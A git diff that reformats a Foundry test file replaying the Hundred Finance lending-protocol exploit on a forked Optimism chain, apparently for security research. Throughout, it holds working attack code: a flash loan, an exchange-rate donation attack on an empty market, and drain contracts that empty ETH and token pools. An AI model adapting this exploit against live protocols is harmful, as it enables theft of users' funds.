@@ -3,11 +3,11 @@ pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
 
-import { IERC20 } from "../contracts/hack-replication/interfaces/IERC20.sol";
-import { crETH } from "../contracts/hack-replication/interfaces/crETH.sol";
-import { IAaveFlashloan } from "../contracts/hack-replication/interfaces/IAaveFlashloan.sol";
-import { ICErc20Delegate } from "../contracts/hack-replication/interfaces/ICErc20Delegate.sol";
-import { IUnitroller } from "../contracts/hack-replication/interfaces/IUnitroller.sol";
+import {IERC20} from "../contracts/hack-replication/interfaces/IERC20.sol";
+import {crETH} from "../contracts/hack-replication/interfaces/crETH.sol";
+import {IAaveFlashloan} from "../contracts/hack-replication/interfaces/IAaveFlashloan.sol";
+import {ICErc20Delegate} from "../contracts/hack-replication/interfaces/ICErc20Delegate.sol";
+import {IUnitroller} from "../contracts/hack-replication/interfaces/IUnitroller.sol";
 
 // @Analysis
 // https://twitter.com/peckshield/status/1647307128267476992
@@ -35,26 +35,52 @@ contract HundredFinanceHackReplicator is Test {
     ICErc20Delegate private hSUSD;
     ICErc20Delegate private hFRAX;
 
-    IUnitroller unitroller = IUnitroller(0x5a5755E1916F547D04eF43176d4cbe0de4503d5d);
-    IAaveFlashloan aaveV3 = IAaveFlashloan(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
-    address HundredFinanceExploiter = 0x155DA45D374A286d383839b1eF27567A15E67528;
+    IUnitroller unitroller =
+        IUnitroller(0x5a5755E1916F547D04eF43176d4cbe0de4503d5d);
+    IAaveFlashloan aaveV3 =
+        IAaveFlashloan(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
+    address HundredFinanceExploiter =
+        0x155DA45D374A286d383839b1eF27567A15E67528;
 
     function setUp() public {
         // TODO: delete this line to run tests on anvil blockchain
         vm.createSelectFork("optimism", 90_760_765);
 
-        bytes memory modifiedCErc20DelegateBytecode = vm.getDeployedCode("./artifacts/CErc20Delegate.sol/CErc20Delegate.json");
+        bytes memory modifiedCErc20DelegateBytecode = vm.getDeployedCode(
+            "./artifacts/CErc20Delegate.sol/CErc20Delegate.json"
+        );
         // TODO: retrieve modified crETH byte code
         // TODO: assign retrieved modified crETH byte code to crETH address
         // vm.etch(0x1A61A72F5Cf5e857f15ee502210b81f8B3a66263, modifiedCrETHBytecode);
 
-        vm.etch(0x35594E4992DFefcB0C20EC487d7af22a30bDec60, modifiedCErc20DelegateBytecode);
-        vm.etch(0x371cb7683bA0639A21f31E0B20F705e45bC18896, modifiedCErc20DelegateBytecode);
-        vm.etch(0x10E08556D6FdD62A9CE5B3a5b07B0d8b0D093164, modifiedCErc20DelegateBytecode);
-        vm.etch(0x0145BE461a112c60c12c34d5Bc538d10670E99Ab, modifiedCErc20DelegateBytecode);
-        vm.etch(0xb994B84bD13f7c8dD3af5BEe9dfAc68436DCF5BD, modifiedCErc20DelegateBytecode);
-        vm.etch(0x76E47710AEe13581Ba5B19323325cA31c48d4cC3, modifiedCErc20DelegateBytecode);
-        vm.etch(0xd97a2591930E2Da927b1903BAA6763618BD7425b, modifiedCErc20DelegateBytecode);
+        vm.etch(
+            0x35594E4992DFefcB0C20EC487d7af22a30bDec60,
+            modifiedCErc20DelegateBytecode
+        );
+        vm.etch(
+            0x371cb7683bA0639A21f31E0B20F705e45bC18896,
+            modifiedCErc20DelegateBytecode
+        );
+        vm.etch(
+            0x10E08556D6FdD62A9CE5B3a5b07B0d8b0D093164,
+            modifiedCErc20DelegateBytecode
+        );
+        vm.etch(
+            0x0145BE461a112c60c12c34d5Bc538d10670E99Ab,
+            modifiedCErc20DelegateBytecode
+        );
+        vm.etch(
+            0xb994B84bD13f7c8dD3af5BEe9dfAc68436DCF5BD,
+            modifiedCErc20DelegateBytecode
+        );
+        vm.etch(
+            0x76E47710AEe13581Ba5B19323325cA31c48d4cC3,
+            modifiedCErc20DelegateBytecode
+        );
+        vm.etch(
+            0xd97a2591930E2Da927b1903BAA6763618BD7425b,
+            modifiedCErc20DelegateBytecode
+        );
 
         CEther = crETH(0x1A61A72F5Cf5e857f15ee502210b81f8B3a66263);
         hWBTC = ICErc20Delegate(0x35594E4992DFefcB0C20EC487d7af22a30bDec60);
@@ -88,20 +114,44 @@ contract HundredFinanceHackReplicator is Test {
         vm.startPrank(HundredFinanceExploiter);
         hWBTC.transfer(address(this), 1_503_167_295); // anti front-run ?
         vm.stopPrank();
-        aaveV3.flashLoanSimple(address(this), address(WBTC), 500 * 1e8, new bytes(0), 0);
+        aaveV3.flashLoanSimple(
+            address(this),
+            address(WBTC),
+            500 * 1e8,
+            new bytes(0),
+            0
+        );
 
-        emit log_named_decimal_uint("Attacker ETH balance after exploit", address(this).balance, 18);
         emit log_named_decimal_uint(
-            "Attacker USDC balance after exploit", USDC.balanceOf(address(this)), USDC.decimals()
-        );
-        emit log_named_decimal_uint("Attacker SNX balance after exploit", SNX.balanceOf(address(this)), SNX.decimals());
-        emit log_named_decimal_uint(
-            "Attacker sUSD balance after exploit", sUSD.balanceOf(address(this)), sUSD.decimals()
+            "Attacker ETH balance after exploit",
+            address(this).balance,
+            18
         );
         emit log_named_decimal_uint(
-            "Attacker USDT balance after exploit", USDT.balanceOf(address(this)), USDT.decimals()
+            "Attacker USDC balance after exploit",
+            USDC.balanceOf(address(this)),
+            USDC.decimals()
         );
-        emit log_named_decimal_uint("Attacker DAI balance after exploit", DAI.balanceOf(address(this)), DAI.decimals());
+        emit log_named_decimal_uint(
+            "Attacker SNX balance after exploit",
+            SNX.balanceOf(address(this)),
+            SNX.decimals()
+        );
+        emit log_named_decimal_uint(
+            "Attacker sUSD balance after exploit",
+            sUSD.balanceOf(address(this)),
+            sUSD.decimals()
+        );
+        emit log_named_decimal_uint(
+            "Attacker USDT balance after exploit",
+            USDT.balanceOf(address(this)),
+            USDT.decimals()
+        );
+        emit log_named_decimal_uint(
+            "Attacker DAI balance after exploit",
+            DAI.balanceOf(address(this)),
+            DAI.decimals()
+        );
     }
 
     function executeOperation(
@@ -110,11 +160,7 @@ contract HundredFinanceHackReplicator is Test {
         uint256 premium,
         address initator,
         bytes calldata params
-    )
-        external
-        payable
-        returns (bool)
-    {
+    ) external payable returns (bool) {
         hWBTC.redeem(hWBTC.balanceOf(address(this)));
 
         console.log("1. ETH Drain \r");
@@ -138,12 +184,17 @@ contract HundredFinanceHackReplicator is Test {
 
     function ETHDrains() internal {
         uint256 _salt = uint256(keccak256(abi.encodePacked(uint256(0))));
-        bytes memory creationBytecode = getETHDrainCreationBytecode(address(CEther));
+        bytes memory creationBytecode = getETHDrainCreationBytecode(
+            address(CEther)
+        );
         address DrainAddress = getAddress(creationBytecode, _salt);
         WBTC.transfer(DrainAddress, WBTC.balanceOf(address(this)));
 
         ETHDrain ETHDrainer = new ETHDrain{salt: bytes32(_salt)}(CEther);
-        CEther.liquidateBorrow{ value: 267_919_888_739 }(address(ETHDrainer), address(hWBTC));
+        CEther.liquidateBorrow{value: 267_919_888_739}(
+            address(ETHDrainer),
+            address(hWBTC)
+        );
         hWBTC.redeem(1); // Withdraw remaining share from hWBTC
         console.log("*************************************************");
         console.log("\r");
@@ -151,50 +202,74 @@ contract HundredFinanceHackReplicator is Test {
 
     function tokenDrains(ICErc20Delegate hToken, uint256 repayAmount) internal {
         uint256 _salt = uint256(keccak256(abi.encodePacked(uint256(0))));
-        bytes memory creationBytecode = gettokenDrainCreationBytecode(address(hToken));
+        bytes memory creationBytecode = gettokenDrainCreationBytecode(
+            address(hToken)
+        );
         address DrainAddress = getAddress(creationBytecode, _salt);
         WBTC.transfer(DrainAddress, WBTC.balanceOf(address(this)));
 
         TokenDrain tokenDrainer = new TokenDrain{salt: bytes32(_salt)}(hToken);
         IERC20 underlyingToken = IERC20(hToken.underlying());
         underlyingToken.approve(address(hToken), type(uint256).max);
-        hToken.liquidateBorrow(address(tokenDrainer), repayAmount, address(hWBTC));
+        hToken.liquidateBorrow(
+            address(tokenDrainer),
+            repayAmount,
+            address(hWBTC)
+        );
         hWBTC.redeem(1); // Withdraw remaining share from hWBTC
         console.log("*************************************************");
         console.log("\r");
     }
 
-    function getETHDrainCreationBytecode(address token) public pure returns (bytes memory) {
+    function getETHDrainCreationBytecode(
+        address token
+    ) public pure returns (bytes memory) {
         bytes memory bytecode = type(ETHDrain).creationCode;
         return abi.encodePacked(bytecode, abi.encode(token));
     }
 
-    function gettokenDrainCreationBytecode(address token) public pure returns (bytes memory) {
+    function gettokenDrainCreationBytecode(
+        address token
+    ) public pure returns (bytes memory) {
         bytes memory bytecode = type(TokenDrain).creationCode;
         return abi.encodePacked(bytecode, abi.encode(token));
     }
 
-    function getAddress(bytes memory bytecode, uint256 _salt) public view returns (address) {
-        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), _salt, keccak256(bytecode)));
+    function getAddress(
+        bytes memory bytecode,
+        uint256 _salt
+    ) public view returns (address) {
+        bytes32 hash = keccak256(
+            abi.encodePacked(
+                bytes1(0xff),
+                address(this),
+                _salt,
+                keccak256(bytecode)
+            )
+        );
         return address(uint160(uint256(hash)));
     }
 
-    receive() external payable { }
+    receive() external payable {}
 }
 
 contract ETHDrain is Test {
     IERC20 WBTC = IERC20(0x68f180fcCe6836688e9084f035309E29Bf0A2095);
-    ICErc20Delegate hWBTC = ICErc20Delegate(0x35594E4992DFefcB0C20EC487d7af22a30bDec60);
-    IUnitroller unitroller = IUnitroller(0x5a5755E1916F547D04eF43176d4cbe0de4503d5d);
+    ICErc20Delegate hWBTC =
+        ICErc20Delegate(0x35594E4992DFefcB0C20EC487d7af22a30bDec60);
+    IUnitroller unitroller =
+        IUnitroller(0x5a5755E1916F547D04eF43176d4cbe0de4503d5d);
     crETH CEtherDelegate;
 
     constructor(crETH Delegate) payable {
-        console.log("First step, Deposit a small amount of WBTC to the empty hWBTC pool to obtain shares");
+        console.log(
+            "First step, Deposit a small amount of WBTC to the empty hWBTC pool to obtain shares"
+        );
         CEtherDelegate = Delegate;
         WBTC.approve(address(hWBTC), type(uint256).max);
         hWBTC.mint(4 * 1e8);
         hWBTC.redeem(hWBTC.totalSupply() - 2); // completing the initial deposit, the shares of hWBTC and the amount of
-            // WBTC in hWBTC are at a minimum
+        // WBTC in hWBTC are at a minimum
         console2.log(
             "ETHDrain's share in hWBTC:",
             hWBTC.balanceOf(address(this)),
@@ -206,16 +281,22 @@ contract ETHDrain is Test {
         console.log(
             "Second step, Donate a large amount of WBTC to the hWBTC pool to increase the exchangeRate(the number of WBTC represented by each share)"
         );
-        (,,, uint256 exchangeRate_1) = hWBTC.getAccountSnapshot(address(this));
+        (, , , uint256 exchangeRate_1) = hWBTC.getAccountSnapshot(
+            address(this)
+        );
         console.log("exchangeRate before manipulation:", exchangeRate_1);
         uint256 donationAmount = WBTC.balanceOf(address(this));
         WBTC.transfer(address(hWBTC), donationAmount); // "donation" exchangeRate manipulation
         uint256 WBTCAmountInhWBTC = WBTC.balanceOf(address(hWBTC));
-        (,,, uint256 exchangeRate_2) = hWBTC.getAccountSnapshot(address(this));
+        (, , , uint256 exchangeRate_2) = hWBTC.getAccountSnapshot(
+            address(this)
+        );
         console.log("exchangeRate after manipulation:", exchangeRate_2);
         console.log("\r");
 
-        console.log("Third setp, Lend tokens from the hWBTC pool and send to exploiter");
+        console.log(
+            "Third setp, Lend tokens from the hWBTC pool and send to exploiter"
+        );
         address[] memory cTokens = new address[](1);
         cTokens[0] = address(hWBTC);
         unitroller.enterMarkets(cTokens);
@@ -228,14 +309,15 @@ contract ETHDrain is Test {
         uint256 redeemAmount = donationAmount - 1;
         console.log(
             "Calculate the amount of shares represented by the redeem amount:",
-            redeemAmount * hWBTC.totalSupply() / WBTCAmountInhWBTC
+            (redeemAmount * hWBTC.totalSupply()) / WBTCAmountInhWBTC
         );
         console.log(
-            "another way of calculating, redeemAmount * 1e18 / exchangeRate:", redeemAmount * 1e18 / exchangeRate_2
+            "another way of calculating, redeemAmount * 1e18 / exchangeRate:",
+            (redeemAmount * 1e18) / exchangeRate_2
         );
         console.log(
             "Due to the inflation attack, the attacker redeems all previously donated WBTC with a calculated share of:",
-            redeemAmount * hWBTC.totalSupply() / WBTCAmountInhWBTC
+            (redeemAmount * hWBTC.totalSupply()) / WBTCAmountInhWBTC
         );
         hWBTC.redeemUnderlying(redeemAmount);
         console2.log(
@@ -251,22 +333,26 @@ contract ETHDrain is Test {
         console.log("\r");
     }
 
-    receive() external payable { }
+    receive() external payable {}
 }
 
 contract TokenDrain is Test {
     IERC20 WBTC = IERC20(0x68f180fcCe6836688e9084f035309E29Bf0A2095);
-    ICErc20Delegate hWBTC = ICErc20Delegate(0x35594E4992DFefcB0C20EC487d7af22a30bDec60);
-    IUnitroller unitroller = IUnitroller(0x5a5755E1916F547D04eF43176d4cbe0de4503d5d);
+    ICErc20Delegate hWBTC =
+        ICErc20Delegate(0x35594E4992DFefcB0C20EC487d7af22a30bDec60);
+    IUnitroller unitroller =
+        IUnitroller(0x5a5755E1916F547D04eF43176d4cbe0de4503d5d);
     ICErc20Delegate CErc20Delegate;
 
     constructor(ICErc20Delegate Delegate) payable {
-        console.log("First step, Deposit a small amount of WBTC to the empty hWBTC pool to obtain shares");
+        console.log(
+            "First step, Deposit a small amount of WBTC to the empty hWBTC pool to obtain shares"
+        );
         CErc20Delegate = Delegate;
         WBTC.approve(address(hWBTC), type(uint256).max);
         hWBTC.mint(4 * 1e8);
         hWBTC.redeem(hWBTC.totalSupply() - 2); // completing the initial deposit, the shares of hWBTC and the amount of
-            // WBTC in hWBTC are at a minimum
+        // WBTC in hWBTC are at a minimum
         console2.log(
             "toeknDrain's share in hWBTC:",
             hWBTC.balanceOf(address(this)),
@@ -278,16 +364,22 @@ contract TokenDrain is Test {
         console.log(
             "Second step, Donate a large amount of WBTC to the hWBTC pool to increase the exchangeRate(the number of WBTC represented by each share)"
         );
-        (,,, uint256 exchangeRate_1) = hWBTC.getAccountSnapshot(address(this));
+        (, , , uint256 exchangeRate_1) = hWBTC.getAccountSnapshot(
+            address(this)
+        );
         console.log("exchangeRate before manipulation:", exchangeRate_1);
         uint256 donationAmount = WBTC.balanceOf(address(this));
         WBTC.transfer(address(hWBTC), donationAmount); // "donation" exchangeRate manipulation
         uint256 WBTCAmountInhWBTC = WBTC.balanceOf(address(hWBTC));
-        (,,, uint256 exchangeRate_2) = hWBTC.getAccountSnapshot(address(this));
+        (, , , uint256 exchangeRate_2) = hWBTC.getAccountSnapshot(
+            address(this)
+        );
         console.log("exchangeRate after manipulation:", exchangeRate_2);
         console.log("\r");
 
-        console.log("Third setp, Lend tokens from the hWBTC pool and send to exploiter");
+        console.log(
+            "Third setp, Lend tokens from the hWBTC pool and send to exploiter"
+        );
         address[] memory cTokens = new address[](1);
         cTokens[0] = address(hWBTC);
         unitroller.enterMarkets(cTokens);
@@ -301,14 +393,15 @@ contract TokenDrain is Test {
         uint256 redeemAmount = donationAmount;
         console.log(
             "Calculate the amount of shares represented by the redeem amount:",
-            redeemAmount * hWBTC.totalSupply() / WBTCAmountInhWBTC
+            (redeemAmount * hWBTC.totalSupply()) / WBTCAmountInhWBTC
         );
         console.log(
-            "another way of calculating, redeemAmount * 1e18 / exchangeRate:", redeemAmount * 1e18 / exchangeRate_2
+            "another way of calculating, redeemAmount * 1e18 / exchangeRate:",
+            (redeemAmount * 1e18) / exchangeRate_2
         );
         console.log(
             "Due to the inflation attack, the attacker redeems all previously donated WBTC with a calculated share of:",
-            redeemAmount * hWBTC.totalSupply() / WBTCAmountInhWBTC
+            (redeemAmount * hWBTC.totalSupply()) / WBTCAmountInhWBTC
         );
         hWBTC.redeemUnderlying(redeemAmount);
         console2.log(
